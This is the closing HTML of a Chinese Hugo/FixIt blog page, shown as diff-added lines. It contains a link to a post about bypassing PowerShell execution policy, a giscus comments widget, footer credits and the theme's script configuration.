+      <a href="/powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/" class="post-nav-item" rel="next" title="PowerShell执行策略的简单绕过">PowerShell执行策略的简单绕过<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
